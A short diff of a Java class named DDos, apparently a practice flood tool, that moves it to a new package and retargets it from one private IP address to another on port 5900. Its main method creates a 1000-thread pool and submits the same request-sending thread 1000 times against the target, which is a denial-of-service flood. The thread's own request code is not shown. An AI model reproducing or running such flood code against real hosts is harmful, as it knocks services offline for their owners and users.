@@ -1,4 +1,4 @@
-package com.qianfeng.common.DealWithFile;
+package com.qianfeng.common.MyUtils;
 
 
 import org.apache.log4j.Logger;
@@ -19,7 +19,7 @@ public class DDos {
     public static void main(String[] args) {
         ExecutorService es = Executors.newFixedThreadPool(1000);
     Mythread mythread = new Mythread();
-    mythread.setDestPath("http://192.168.216.111");
+    mythread.setDestPath("http://10.0.152.207:5900");
     Thread thread =new Thread(mythread);
     for (int i = 0;i<1000;i++){
         es.execute(thread);
